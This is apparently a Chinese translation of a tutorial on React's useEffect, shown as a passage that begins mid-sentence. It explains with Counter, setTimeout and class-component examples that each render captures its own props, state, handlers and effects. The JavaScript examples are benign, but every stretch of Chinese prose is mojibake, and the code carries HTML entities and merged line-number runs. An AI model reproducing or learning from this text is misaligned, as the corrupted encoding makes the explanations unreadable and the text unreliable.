·å¯ä»¥çœ‹æˆ‘ä»¬å®˜ç½‘FAQä¸­çš„è¿™ä¸ªå›ç­”ã€‚ æˆ‘å¸Œæœ›è¿™ä¸ªæ‘˜è¦å¯¹ä½ æœ‰æ‰€å¸®åŠ©ï¼è¦ä¸ï¼Œæˆ‘ä»¬å¼€å§‹æ­£æ–‡ã€‚ æ¯ä¸€æ¬¡æ¸²æŸ“éƒ½æœ‰å®ƒè‡ªå·±çš„ Props and Stateåœ¨æˆ‘ä»¬è®¨è®ºeffectsä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆè®¨è®ºä¸€ä¸‹æ¸²æŸ“ï¼ˆrenderingï¼‰ã€‚ æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªè®¡æ•°å™¨ç»„ä»¶Counterï¼Œæ³¨æ„é«˜äº®çš„é‚£ä¸€è¡Œï¼š 1234567891011function Counter() &#123; const [count, setCount] = useState(0); return ( &lt;div&gt; &lt;p&gt;You clicked &#123;count&#125; times&lt;/p&gt; &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt; Click me &lt;/button&gt; &lt;/div&gt; );&#125; é«˜äº®çš„ä»£ç ç©¶ç«Ÿæ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿcount ä¼šâ€œç›‘å¬â€çŠ¶æ€çš„å˜åŒ–å¹¶è‡ªåŠ¨æ›´æ–°å—ï¼Ÿè¿™ä¹ˆæƒ³å¯èƒ½æ˜¯å­¦ä¹ Reactçš„æ—¶å€™æœ‰ç”¨çš„ç¬¬ä¸€ç›´è§‰ï¼Œä½†å®ƒå¹¶ä¸æ˜¯ç²¾ç¡®çš„å¿ƒæ™ºæ¨¡å‹ã€‚ ä¸Šé¢ä¾‹å­ä¸­ï¼Œcountä»…æ˜¯ä¸€ä¸ªæ•°å­—è€Œå·²ã€‚å®ƒä¸æ˜¯ç¥å¥‡çš„â€œdata bindingâ€, â€œwatcherâ€, â€œproxyâ€ï¼Œæˆ–è€…å…¶ä»–ä»»ä½•ä¸œè¥¿ã€‚å®ƒå°±æ˜¯ä¸€ä¸ªæ™®é€šçš„æ•°å­—åƒä¸‹é¢è¿™ä¸ªä¸€æ ·ï¼š 1234const count = 42;// ...&lt;p&gt;You clicked &#123;count&#125; times&lt;/p&gt;// ... æˆ‘ä»¬çš„ç»„ä»¶ç¬¬ä¸€æ¬¡æ¸²æŸ“çš„æ—¶å€™ï¼Œä»useState()æ‹¿åˆ°countçš„åˆå§‹å€¼0ã€‚å½“æˆ‘ä»¬è°ƒç”¨setCount(1)ï¼ŒReactä¼šå†æ¬¡æ¸²æŸ“ç»„ä»¶ï¼Œè¿™ä¸€æ¬¡countæ˜¯1ã€‚å¦‚æ­¤ç­‰ç­‰ï¼š 1234567891011121314151617181920// During first renderfunction Counter() &#123; const count = 0; // Returned by useState() // ... &lt;p&gt;You clicked &#123;count&#125; times&lt;/p&gt; // ...&#125;// After a click, our function is called againfunction Counter() &#123; const count = 1; // Returned by useState() // ... &lt;p&gt;You clicked &#123;count&#125; times&lt;/p&gt; // ...&#125;// After another click, our function is called againfunction Counter() &#123; const count = 2; // Returned by useState() // ... &lt;p&gt;You clicked &#123;count&#125; times&lt;/p&gt; // ...&#125; å½“æˆ‘ä»¬æ›´æ–°çŠ¶æ€çš„æ—¶å€™ï¼ŒReactä¼šé‡æ–°æ¸²æŸ“ç»„ä»¶ã€‚æ¯ä¸€æ¬¡æ¸²æŸ“éƒ½èƒ½æ‹¿åˆ°ç‹¬ç«‹çš„count çŠ¶æ€ï¼Œè¿™ä¸ªçŠ¶æ€å€¼æ˜¯å‡½æ•°ä¸­çš„ä¸€ä¸ªå¸¸é‡ã€‚ æ‰€ä»¥ä¸‹é¢çš„è¿™è¡Œä»£ç æ²¡æœ‰åšä»»ä½•ç‰¹æ®Šçš„æ•°æ®ç»‘å®šï¼š 1&lt;p&gt;You clicked &#123;count&#125; times&lt;/p&gt; å®ƒä»…ä»…åªæ˜¯åœ¨æ¸²æŸ“è¾“å‡ºä¸­æ’å…¥äº†countè¿™ä¸ªæ•°å­—ã€‚è¿™ä¸ªæ•°å­—ç”±Reactæä¾›ã€‚å½“setCountçš„æ—¶å€™ï¼ŒReactä¼šå¸¦ç€ä¸€ä¸ªä¸åŒçš„countå€¼å†æ¬¡è°ƒç”¨ç»„ä»¶ã€‚ç„¶åï¼ŒReactä¼šæ›´æ–°DOMä»¥ä¿æŒå’Œæ¸²æŸ“è¾“å‡ºä¸€è‡´ã€‚ è¿™é‡Œå…³é”®çš„ç‚¹åœ¨äºä»»æ„ä¸€æ¬¡æ¸²æŸ“ä¸­çš„countå¸¸é‡éƒ½ä¸ä¼šéšç€æ—¶é—´æ”¹å˜ã€‚æ¸²æŸ“è¾“å‡ºä¼šå˜æ˜¯å› ä¸ºæˆ‘ä»¬çš„ç»„ä»¶è¢«ä¸€æ¬¡æ¬¡è°ƒç”¨ï¼Œè€Œæ¯ä¸€æ¬¡è°ƒç”¨å¼•èµ·çš„æ¸²æŸ“ä¸­ï¼Œå®ƒåŒ…å«çš„countå€¼ç‹¬ç«‹äºå…¶ä»–æ¸²æŸ“ã€‚ ï¼ˆå…³äºè¿™ä¸ªè¿‡ç¨‹æ›´æ·±å…¥çš„æ¢è®¨å¯ä»¥æŸ¥çœ‹æˆ‘çš„å¦ä¸€ç¯‡æ–‡ç«  React as a UI Runtimeã€‚ï¼‰ æ¯ä¸€æ¬¡æ¸²æŸ“éƒ½æœ‰å®ƒè‡ªå·±çš„äº‹ä»¶å¤„ç†å‡½æ•°åˆ°ç›®å‰ä¸ºæ­¢ä¸€åˆ‡éƒ½è¿˜å¥½ã€‚é‚£ä¹ˆäº‹ä»¶å¤„ç†å‡½æ•°å‘¢ï¼Ÿ çœ‹ä¸‹é¢çš„è¿™ä¸ªä¾‹å­ã€‚å®ƒåœ¨ä¸‰ç§’åä¼šalertç‚¹å‡»æ¬¡æ•°countï¼š 12345678910111213function Counter() &#123; const [count, setCount] = useState(0); function handleAlertClick() &#123; setTimeout(() =&gt; &#123; alert('You clicked on: ' + count); &#125;, 3000); &#125; return ( &lt;div&gt; &lt;p&gt;You clicked &#123;count&#125; times&lt;/p&gt; &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt; Click me &lt;/button&gt; &lt;button onClick=&#123;handleAlertClick&#125;&gt; Show alert &lt;/button&gt; &lt;/div&gt; );&#125; å¦‚æœæˆ‘æŒ‰ç…§ä¸‹é¢çš„æ­¥éª¤å»æ“ä½œï¼š ç‚¹å‡»å¢åŠ counteråˆ°3 ç‚¹å‡»ä¸€ä¸‹ â€œShow alertâ€ ç‚¹å‡»å¢åŠ  counteråˆ°5å¹¶ä¸”åœ¨å®šæ—¶å™¨å›è°ƒè§¦å‘å‰å®Œæˆ ä½ çŒœalertä¼šå¼¹å‡ºä»€ä¹ˆå‘¢ï¼Ÿä¼šæ˜¯5å—ï¼Ÿâ€” è¿™ä¸ªå€¼æ˜¯alertçš„æ—¶å€™counterçš„å®æ—¶çŠ¶æ€ã€‚æˆ–è€…ä¼šæ˜¯3å—ï¼Ÿâ€” è¿™ä¸ªå€¼æ˜¯æˆ‘ç‚¹å‡»æ—¶å€™çš„çŠ¶æ€ã€‚ å‰§é€é¢„è­¦ æ¥è‡ªå·± è¯•è¯•å§ï¼ å¦‚æœç»“æœå’Œä½ é¢„æ–™ä¸ä¸€æ ·ï¼Œä½ å¯ä»¥æƒ³è±¡ä¸€ä¸ªæ›´å®é™…çš„ä¾‹å­ï¼šä¸€ä¸ªèŠå¤©åº”ç”¨åœ¨stateä¸­ä¿å­˜äº†å½“å‰æ¥æ”¶è€…çš„IDï¼Œä»¥åŠä¸€ä¸ªå‘é€æŒ‰é’®ã€‚ è¿™ç¯‡æ–‡ç« æ·±å…¥æ¢ç´¢äº†ä¸ªä¸­ç¼˜ç”±ã€‚æ­£ç¡®çš„ç­”æ¡ˆå°±æ˜¯3ã€‚ alertä¼šâ€œæ•è·â€æˆ‘ç‚¹å‡»æŒ‰é’®æ—¶å€™çš„çŠ¶æ€ã€‚ ï¼ˆè™½ç„¶æœ‰å…¶ä»–åŠæ³•å¯ä»¥å®ç°ä¸åŒçš„è¡Œä¸ºï¼Œä½†ç°åœ¨æˆ‘ä¼šä¸“æ³¨äºè¿™ä¸ªé»˜è®¤çš„åœºæ™¯ã€‚å½“æˆ‘ä»¬åœ¨æ„å»ºä¸€ç§å¿ƒæ™ºæ¨¡å‹çš„æ—¶å€™ï¼Œåœ¨å¯é€‰çš„ç­–ç•¥ä¸­åˆ†è¾¨å‡ºâ€œæœ€å°é˜»åŠ›è·¯å¾„â€æ˜¯éå¸¸é‡è¦çš„ã€‚ï¼‰ ä½†å®ƒç©¶ç«Ÿæ˜¯å¦‚ä½•å·¥ä½œçš„å‘¢ï¼Ÿ æˆ‘ä»¬å‘ç°countåœ¨æ¯ä¸€æ¬¡å‡½æ•°è°ƒç”¨ä¸­éƒ½æ˜¯ä¸€ä¸ªå¸¸é‡å€¼ã€‚å€¼å¾—å¼ºè°ƒçš„æ˜¯ â€” æˆ‘ä»¬çš„ç»„ä»¶å‡½æ•°æ¯æ¬¡æ¸²æŸ“éƒ½ä¼šè¢«è°ƒç”¨ï¼Œä½†æ˜¯æ¯ä¸€æ¬¡è°ƒç”¨ä¸­countå€¼éƒ½æ˜¯å¸¸é‡ï¼Œå¹¶ä¸”å®ƒè¢«èµ‹äºˆäº†å½“å‰æ¸²æŸ“ä¸­çš„çŠ¶æ€å€¼ã€‚ è¿™å¹¶ä¸æ˜¯Reactç‰¹æœ‰çš„ï¼Œæ™®é€šçš„å‡½æ•°ä¹Ÿæœ‰ç±»ä¼¼çš„è¡Œä¸ºï¼š 1234567891011121314function sayHi(person) &#123; const name = person.name; setTimeout(() =&gt; &#123; alert('Hello, ' + name); &#125;, 3000);&#125;let someone = &#123;name: 'Dan'&#125;;sayHi(someone);someone = &#123;name: 'Yuzhi'&#125;;sayHi(someone);someone = &#123;name: 'Dominic'&#125;;sayHi(someone); åœ¨ è¿™ä¸ªä¾‹å­ä¸­, å¤–å±‚çš„someoneä¼šè¢«èµ‹å€¼å¾ˆå¤šæ¬¡ï¼ˆå°±åƒåœ¨Reactä¸­ï¼Œå½“å‰çš„ç»„ä»¶çŠ¶æ€ä¼šæ”¹å˜ä¸€æ ·ï¼‰ã€‚ç„¶åï¼Œåœ¨sayHiå‡½æ•°ä¸­ï¼Œå±€éƒ¨å¸¸é‡nameä¼šå’ŒæŸæ¬¡è°ƒç”¨ä¸­çš„personå…³è”ã€‚å› ä¸ºè¿™ä¸ªå¸¸é‡æ˜¯å±€éƒ¨çš„ï¼Œæ‰€ä»¥æ¯ä¸€æ¬¡è°ƒç”¨éƒ½æ˜¯ç›¸äº’ç‹¬ç«‹çš„ã€‚ç»“æœå°±æ˜¯ï¼Œå½“å®šæ—¶å™¨å›è°ƒè§¦å‘çš„æ—¶å€™ï¼Œæ¯ä¸€ä¸ªalertéƒ½ä¼šå¼¹å‡ºå®ƒæ‹¥æœ‰çš„nameã€‚ è¿™å°±è§£é‡Šäº†æˆ‘ä»¬çš„äº‹ä»¶å¤„ç†å‡½æ•°å¦‚ä½•æ•è·äº†ç‚¹å‡»æ—¶å€™çš„countå€¼ã€‚å¦‚æœæˆ‘ä»¬åº”ç”¨ç›¸åŒçš„æ›¿æ¢åŸç†ï¼Œæ¯ä¸€æ¬¡æ¸²æŸ“â€œçœ‹åˆ°â€çš„æ˜¯å®ƒè‡ªå·±çš„countï¼š 1234567891011121314151617181920212223242526272829303132// During first renderfunction Counter() &#123; const count = 0; // Returned by useState() // ... function handleAlertClick() &#123; setTimeout(() =&gt; &#123; alert('You clicked on: ' + count); &#125;, 3000); &#125; // ...&#125;// After a click, our function is called againfunction Counter() &#123; const count = 1; // Returned by useState() // ... function handleAlertClick() &#123; setTimeout(() =&gt; &#123; alert('You clicked on: ' + count); &#125;, 3000); &#125; // ...&#125;// After another click, our function is called againfunction Counter() &#123; const count = 2; // Returned by useState() // ... function handleAlertClick() &#123; setTimeout(() =&gt; &#123; alert('You clicked on: ' + count); &#125;, 3000); &#125; // ...&#125; æ‰€ä»¥å®é™…ä¸Šï¼Œæ¯ä¸€æ¬¡æ¸²æŸ“éƒ½æœ‰ä¸€ä¸ªâ€œæ–°ç‰ˆæœ¬â€çš„handleAlertClickã€‚æ¯ä¸€ä¸ªç‰ˆæœ¬çš„handleAlertClickâ€œè®°ä½â€ äº†å®ƒè‡ªå·±çš„ countï¼š 1234567891011121314151617181920212223242526272829303132// During first renderfunction Counter() &#123; // ... function handleAlertClick() &#123; setTimeout(() =&gt; &#123; alert('You clicked on: ' + 0); &#125;, 3000); &#125; // ... &lt;button onClick=&#123;handleAlertClick&#125; /&gt; // The one with 0 inside // ...&#125;// After a click, our function is called againfunction Counter() &#123; // ... function handleAlertClick() &#123; setTimeout(() =&gt; &#123; alert('You clicked on: ' + 1); &#125;, 3000); &#125; // ... &lt;button onClick=&#123;handleAlertClick&#125; /&gt; // The one with 1 inside // ...&#125;// After another click, our function is called againfunction Counter() &#123; // ... function handleAlertClick() &#123; setTimeout(() =&gt; &#123; alert('You clicked on: ' + 2); &#125;, 3000); &#125; // ... &lt;button onClick=&#123;handleAlertClick&#125; /&gt; // The one with 2 inside // ...&#125; è¿™å°±æ˜¯ä¸ºä»€ä¹ˆåœ¨è¿™ä¸ªdemoä¸­ä¸­ï¼Œäº‹ä»¶å¤„ç†å‡½æ•°â€œå±äºâ€æŸä¸€æ¬¡ç‰¹å®šçš„æ¸²æŸ“ï¼Œå½“ä½ ç‚¹å‡»çš„æ—¶å€™ï¼Œå®ƒä¼šä½¿ç”¨é‚£æ¬¡æ¸²æŸ“ä¸­counterçš„çŠ¶æ€å€¼ã€‚ åœ¨ä»»æ„ä¸€æ¬¡æ¸²æŸ“ä¸­ï¼Œpropså’Œstateæ˜¯å§‹ç»ˆä¿æŒä¸å˜çš„ã€‚å¦‚æœpropså’Œstateåœ¨ä¸åŒçš„æ¸²æŸ“ä¸­æ˜¯ç›¸äº’ç‹¬ç«‹çš„ï¼Œé‚£ä¹ˆä½¿ç”¨åˆ°å®ƒä»¬çš„ä»»ä½•å€¼ä¹Ÿæ˜¯ç‹¬ç«‹çš„ï¼ˆåŒ…æ‹¬äº‹ä»¶å¤„ç†å‡½æ•°ï¼‰ã€‚å®ƒä»¬éƒ½â€œå±äºâ€ä¸€æ¬¡ç‰¹å®šçš„æ¸²æŸ“ã€‚å³ä¾¿æ˜¯äº‹ä»¶å¤„ç†ä¸­çš„å¼‚æ­¥å‡½æ•°è°ƒç”¨â€œçœ‹åˆ°â€çš„ä¹Ÿæ˜¯è¿™æ¬¡æ¸²æŸ“ä¸­çš„countå€¼ã€‚ å¤‡æ³¨ï¼šä¸Šé¢æˆ‘å°†å…·ä½“çš„countå€¼ç›´æ¥å†…è”åˆ°äº†handleAlertClickå‡½æ•°ä¸­ã€‚è¿™ç§å¿ƒæ™ºä¸Šçš„æ›¿æ¢æ˜¯å®‰å…¨çš„å› ä¸ºcount å€¼åœ¨æŸæ¬¡ç‰¹å®šæ¸²æŸ“ä¸­ä¸å¯èƒ½è¢«æ”¹å˜ã€‚å®ƒè¢«å£°æ˜æˆäº†ä¸€ä¸ªå¸¸é‡å¹¶ä¸”æ˜¯ä¸€ä¸ªæ•°å­—ã€‚è¿™æ ·å»æ€è€ƒå…¶ä»–ç±»å‹çš„å€¼æ¯”å¦‚å¯¹è±¡ä¹ŸåŒæ ·æ˜¯å®‰å…¨çš„ï¼Œå½“ç„¶éœ€è¦åœ¨æˆ‘ä»¬éƒ½åŒæ„åº”è¯¥é¿å…ç›´æ¥ä¿®æ”¹stateè¿™ä¸ªå‰æä¸‹ã€‚é€šè¿‡è°ƒç”¨setSomething(newObj)çš„æ–¹å¼å»ç”Ÿæˆä¸€ä¸ªæ–°çš„å¯¹è±¡è€Œä¸æ˜¯ç›´æ¥ä¿®æ”¹å®ƒæ˜¯æ›´å¥½çš„é€‰æ‹©ï¼Œå› ä¸ºè¿™æ ·èƒ½ä¿è¯ä¹‹å‰æ¸²æŸ“ä¸­çš„stateä¸ä¼šè¢«æ±¡æŸ“ã€‚ æ¯æ¬¡æ¸²æŸ“éƒ½æœ‰å®ƒè‡ªå·±çš„Effectsè¿™ç¯‡æ–‡ç« æ˜¯å…³äºeffectsçš„ï¼Œä½†ç›®å‰æˆ‘ä»¬å±…ç„¶è¿˜æ²¡æœ‰è®¨è®ºeffectsï¼ è¨€å½’æ­£ä¼ ï¼Œç”±ä¸Šé¢çš„åˆ†æå¾—å‡ºä¸€ä¸ªç»“æœï¼Œeffectså…¶å®å¹¶æ²¡æœ‰ä»€ä¹ˆä¸¤æ ·ã€‚ è®©æˆ‘ä»¬å›åˆ°å®˜ç½‘æ–‡æ¡£ä¸­çš„è¿™ä¸ªä¾‹å­ï¼š 12345678910111213function Counter() &#123; const [count, setCount] = useState(0); useEffect(() =&gt; &#123; document.title = `You clicked $&#123;count&#125; times`; &#125;); return ( &lt;div&gt; &lt;p&gt;You clicked &#123;count&#125; times&lt;/p&gt; &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt; Click me &lt;/button&gt; &lt;/div&gt; );&#125; æŠ›ä¸€ä¸ªé—®é¢˜ç»™ä½ ï¼šeffectæ˜¯å¦‚ä½•è¯»å–åˆ°æœ€æ–°çš„count çŠ¶æ€å€¼çš„å‘¢ï¼Ÿ ä¹Ÿè®¸ï¼Œæ˜¯æŸç§â€œdata bindingâ€æˆ–â€œwatchingâ€æœºåˆ¶ä½¿å¾—countèƒ½å¤Ÿåœ¨effectå‡½æ•°å†…æ›´æ–°ï¼Ÿä¹Ÿæˆ–è®¸countæ˜¯ä¸€ä¸ªå¯å˜çš„å€¼ï¼ŒReactä¼šåœ¨æˆ‘ä»¬ç»„ä»¶å†…éƒ¨ä¿®æ”¹å®ƒä»¥ä½¿æˆ‘ä»¬çš„effectå‡½æ•°æ€»èƒ½æ‹¿åˆ°æœ€æ–°çš„å€¼ï¼Ÿ éƒ½ä¸æ˜¯ã€‚ æˆ‘ä»¬å·²ç»çŸ¥é“countæ˜¯æŸä¸ªç‰¹å®šæ¸²æŸ“ä¸­çš„å¸¸é‡ã€‚äº‹ä»¶å¤„ç†å‡½æ•°â€œçœ‹åˆ°â€çš„æ˜¯å±äºå®ƒé‚£æ¬¡ç‰¹å®šæ¸²æŸ“ä¸­çš„countçŠ¶æ€å€¼ã€‚å¯¹äºeffectsä¹ŸåŒæ ·å¦‚æ­¤ï¼š å¹¶ä¸æ˜¯countçš„å€¼åœ¨â€œä¸å˜â€çš„effectä¸­å‘ç”Ÿäº†æ”¹å˜ï¼Œè€Œæ˜¯*effect å‡½æ•°æœ¬èº«*åœ¨æ¯ä¸€æ¬¡æ¸²æŸ“ä¸­éƒ½ä¸ç›¸åŒã€‚ æ¯ä¸€ä¸ªeffectç‰ˆæœ¬â€œçœ‹åˆ°â€çš„countå€¼éƒ½æ¥è‡ªäºå®ƒå±äºçš„é‚£æ¬¡æ¸²æŸ“ï¼š 1234567891011121314151617181920212223// During first renderfunction Counter() &#123; // ... useEffect( // Effect function from first render () =&gt; &#123; document.title = `You clicked $&#123;0&#125; times`; &#125; ); // ...&#125;// After a click, our function is called againfunction Counter() &#123; // ... useEffect( // Effect function from second render () =&gt; &#123; document.title = `You clicked $&#123;1&#125; times`; &#125; ); // ...&#125;// After another click, our function is called againfunction Counter() &#123; // ... useEffect( // Effect function from third render () =&gt; &#123; document.title = `You clicked $&#123;2&#125; times`; &#125; ); // ..&#125; Reactä¼šè®°ä½ä½ æä¾›çš„effectå‡½æ•°ï¼Œå¹¶ä¸”ä¼šåœ¨æ¯æ¬¡æ›´æ”¹ä½œç”¨äºDOMå¹¶è®©æµè§ˆå™¨ç»˜åˆ¶å±å¹•åå»è°ƒç”¨å®ƒã€‚ æ‰€ä»¥è™½ç„¶æˆ‘ä»¬è¯´çš„æ˜¯ä¸€ä¸ª effectï¼ˆè¿™é‡ŒæŒ‡æ›´æ–°documentçš„titleï¼‰ï¼Œä½†å…¶å®æ¯æ¬¡æ¸²æŸ“éƒ½æ˜¯ä¸€ä¸ªä¸åŒçš„å‡½æ•° â€” å¹¶ä¸”æ¯ä¸ªeffectå‡½æ•°â€œçœ‹åˆ°â€çš„propså’Œstateéƒ½æ¥è‡ªäºå®ƒå±äºçš„é‚£æ¬¡ç‰¹å®šæ¸²æŸ“ã€‚ æ¦‚å¿µä¸Šï¼Œä½ å¯ä»¥æƒ³è±¡effectsæ˜¯æ¸²æŸ“ç»“æœçš„ä¸€éƒ¨åˆ†ã€‚ ä¸¥æ ¼åœ°è¯´ï¼Œå®ƒä»¬å¹¶ä¸æ˜¯ï¼ˆä¸ºäº†å…è®¸Hookçš„ç»„åˆå¹¶ä¸”ä¸å¼•å…¥ç¬¨æ‹™çš„è¯­æ³•æˆ–è€…è¿è¡Œæ—¶ï¼‰ã€‚ä½†æ˜¯åœ¨æˆ‘ä»¬æ„å»ºçš„å¿ƒæ™ºæ¨¡å‹ä¸Šï¼Œeffectå‡½æ•°å±äºæŸä¸ªç‰¹å®šçš„æ¸²æŸ“ï¼Œå°±åƒäº‹ä»¶å¤„ç†å‡½æ•°ä¸€æ ·ã€‚ ä¸ºäº†ç¡®ä¿æˆ‘ä»¬å·²ç»æœ‰äº†æ‰å®çš„ç†è§£ï¼Œæˆ‘ä»¬å†å›é¡¾ä¸€ä¸‹ç¬¬ä¸€æ¬¡çš„æ¸²æŸ“è¿‡ç¨‹ï¼š React: ç»™æˆ‘çŠ¶æ€ä¸º 0æ—¶å€™çš„UIã€‚ ä½ çš„ç»„ä»¶: ç»™ä½ éœ€è¦æ¸²æŸ“çš„å†…å®¹: You clicked 0 timesã€‚ è®°å¾—åœ¨æ¸²æŸ“å®Œäº†ä¹‹åè°ƒç”¨è¿™ä¸ªeffect: () =&gt; { document.title = &#39;You clicked 0 times&#39; }ã€‚ React: æ²¡é—®é¢˜ã€‚å¼€å§‹æ›´æ–°UIï¼Œå–‚æµè§ˆå™¨ï¼Œæˆ‘è¦ç»™DOMæ·»åŠ ä¸€äº›ä¸œè¥¿ã€‚ æµè§ˆå™¨: é…·ï¼Œæˆ‘å·²ç»æŠŠå®ƒç»˜åˆ¶åˆ°å±å¹•ä¸Šäº†ã€‚ React: å¥½çš„ï¼Œ æˆ‘ç°åœ¨å¼€å§‹è¿è¡Œç»™æˆ‘çš„effect è¿è¡Œ () =&gt; { document.title = &#39;You clicked 0 times&#39; }ã€‚ ç°åœ¨æˆ‘ä»¬å›é¡¾ä¸€ä¸‹æˆ‘ä»¬ç‚¹å‡»ä¹‹åå‘ç”Ÿäº†ä»€ä¹ˆï¼š ä½ çš„ç»„ä»¶: å–‚ React, æŠŠæˆ‘çš„çŠ¶æ€è®¾ç½®ä¸º1ã€‚ React: ç»™æˆ‘çŠ¶æ€ä¸º 1æ—¶å€™çš„UIã€‚ ä½ çš„ç»„ä»¶: ç»™ä½ éœ€è¦æ¸²æŸ“çš„å†…å®¹: You clicked 1 timesã€‚ è®°å¾—åœ¨æ¸²æŸ“å®Œäº†ä¹‹åè°ƒç”¨è¿™ä¸ªeffectï¼š () =&gt; { document.title = &#39;You clicked 1 times&#39; }ã€‚ React: æ²¡é—®é¢˜ã€‚å¼€å§‹æ›´æ–°UIï¼Œå–‚æµè§ˆå™¨ï¼Œæˆ‘ä¿®æ”¹äº†DOMã€‚ Browser: é…·ï¼Œæˆ‘å·²ç»å°†æ›´æ”¹ç»˜åˆ¶åˆ°å±å¹•ä¸Šäº†ã€‚ React: å¥½çš„ï¼Œ æˆ‘ç°åœ¨å¼€å§‹è¿è¡Œå±äºè¿™æ¬¡æ¸²æŸ“çš„effect è¿è¡Œ () =&gt; { document.title = &#39;You clicked 1 times&#39; }ã€‚ æ¯ä¸€æ¬¡æ¸²æŸ“éƒ½æœ‰å®ƒè‡ªå·±çš„â€¦æ‰€æœ‰æˆ‘ä»¬ç°åœ¨çŸ¥é“effectsä¼šåœ¨æ¯æ¬¡æ¸²æŸ“åè¿è¡Œï¼Œå¹¶ä¸”æ¦‚å¿µä¸Šå®ƒæ˜¯ç»„ä»¶è¾“å‡ºçš„ä¸€éƒ¨åˆ†ï¼Œå¯ä»¥â€œçœ‹åˆ°â€å±äºæŸæ¬¡ç‰¹å®šæ¸²æŸ“çš„propså’Œstateã€‚ æˆ‘ä»¬æ¥åšä¸€ä¸ªæ€æƒ³å®éªŒï¼Œæ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 12345678910111213function Counter() &#123; const [count, setCount] = useState(0); useEffect(() =&gt; &#123; setTimeout(() =&gt; &#123; console.log(`You clicked $&#123;count&#125; times`); &#125;, 3000); &#125;); return ( &lt;div&gt; &lt;p&gt;You clicked &#123;count&#125; times&lt;/p&gt; &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt; Click me &lt;/button&gt; &lt;/div&gt; );&#125; å¦‚æœæˆ‘ç‚¹å‡»äº†å¾ˆå¤šæ¬¡å¹¶ä¸”åœ¨effecté‡Œè®¾ç½®äº†å»¶æ—¶ï¼Œæ‰“å°å‡ºæ¥çš„ç»“æœä¼šæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ å‰§é€é¢„è­¦ ä½ å¯èƒ½ä¼šè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªå¾ˆç»•çš„é¢˜å¹¶ä¸”ç»“æœæ˜¯åç›´è§‰çš„ã€‚å®Œå…¨é”™äº†ï¼æˆ‘ä»¬çœ‹åˆ°çš„å°±æ˜¯é¡ºåºçš„æ‰“å°è¾“å‡º â€” æ¯ä¸€ä¸ªéƒ½å±äºæŸæ¬¡ç‰¹å®šçš„æ¸²æŸ“ï¼Œå› æ­¤æœ‰å®ƒè¯¥æœ‰çš„countå€¼ã€‚ä½ å¯ä»¥è‡ªå·±è¯•ä¸€è¯•ï¼š ä½ å¯èƒ½ä¼šæƒ³ï¼šâ€œå®ƒå½“ç„¶åº”è¯¥æ˜¯è¿™æ ·çš„ã€‚å¦åˆ™è¿˜ä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿâ€ ä¸è¿‡ï¼Œclassä¸­çš„this.stateå¹¶ä¸æ˜¯è¿™æ ·è¿ä½œçš„ã€‚ä½ å¯èƒ½ä¼šæƒ³å½“ç„¶ä»¥ä¸ºä¸‹é¢çš„class å®ç°å’Œä¸Šé¢æ˜¯ç›¸ç­‰çš„ï¼š 12345componentDidUpdate() &#123; setTimeout(() =&gt; &#123; console.log(`You clicked $&#123;this.state.count&#125; times`); &#125;, 3000);&#125; ç„¶è€Œï¼Œthis.state.countæ€»æ˜¯æŒ‡å‘æœ€æ–°çš„countå€¼ï¼Œè€Œä¸æ˜¯å±äºæŸæ¬¡ç‰¹å®šæ¸²æŸ“çš„å€¼ã€‚æ‰€ä»¥ä½ ä¼šçœ‹åˆ°æ¯æ¬¡æ‰“å°è¾“å‡ºéƒ½æ˜¯5ï¼š æˆ‘è§‰å¾—Hooksè¿™ä¹ˆä¾èµ–Javascripté—­åŒ…æ˜¯æŒºè®½åˆºçš„ä¸€ä»¶äº‹ã€‚æœ‰æ—¶å€™ç»„ä»¶çš„classå®ç°æ–¹å¼ä¼šå—é—­åŒ…ç›¸å…³çš„è‹¦ï¼ˆthe canonical wrong-value-in-a-timeout confusionï¼‰ï¼Œä½†å…¶å®è¿™ä¸ªä¾‹å­ä¸­çœŸæ­£çš„æ··ä¹±æ¥æºæ˜¯å¯å˜æ•°æ®ï¼ˆReact ä¿®æ”¹äº†classä¸­çš„this.stateä½¿å…¶æŒ‡å‘æœ€æ–°çŠ¶æ€ï¼‰ï¼Œå¹¶ä¸æ˜¯é—­åŒ…æœ¬èº«çš„é”™ã€‚ å½“å°é—­çš„å€¼å§‹ç»ˆä¸ä¼šå˜çš„æƒ…å†µä¸‹é—­åŒ…æ˜¯éå¸¸æ£’çš„ã€‚è¿™ä½¿å®ƒä»¬éå¸¸å®¹æ˜“æ€è€ƒå› ä¸ºä½ æœ¬è´¨ä¸Šåœ¨å¼•ç”¨å¸¸é‡ã€‚æ­£å¦‚æˆ‘ä»¬æ‰€è®¨è®ºçš„ï¼Œpropså’Œstateåœ¨æŸä¸ªç‰¹å®šæ¸²æŸ“ä¸­æ˜¯ä¸ä¼šæ”¹å˜çš„ã€‚é¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨é—­åŒ…ä¿®å¤ä¸Šé¢çš„classç‰ˆæœ¬â€¦ é€†æ½®è€ŒåŠ¨åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å¯ä»¥æ˜ç¡®åœ°å–Šå‡ºä¸‹é¢é‡è¦çš„äº‹å®ï¼šæ¯ä¸€ä¸ªç»„ä»¶å†…çš„å‡½æ•°ï¼ˆåŒ…æ‹¬äº‹ä»¶å¤„ç†å‡½æ•°ï¼Œeffectsï¼Œå®šæ—¶å™¨æˆ–è€…APIè°ƒç”¨ç­‰ç­‰ï¼‰ä¼šæ•è·æŸæ¬¡æ¸²æŸ“ä¸­å®šä¹‰çš„propså’Œstateã€‚ æ‰€ä»¥ä¸‹é¢çš„ä¸¤ä¸ªä¾‹å­æ˜¯ç›¸ç­‰çš„ï¼š 1234567891011121314function Example(props) &#123; useEffect(() =&gt; &#123; setTimeout(() =&gt; &#123; console.log(props.counter); &#125;, 1000); &#125;); // ...&#125;function Example(props) &#123; const counter = props.counter; useEffect(() =&gt; &#123; setTimeout(() =&gt; &#123; console.log(counter); &#125;, 1000); &#125;); // ...&#125; 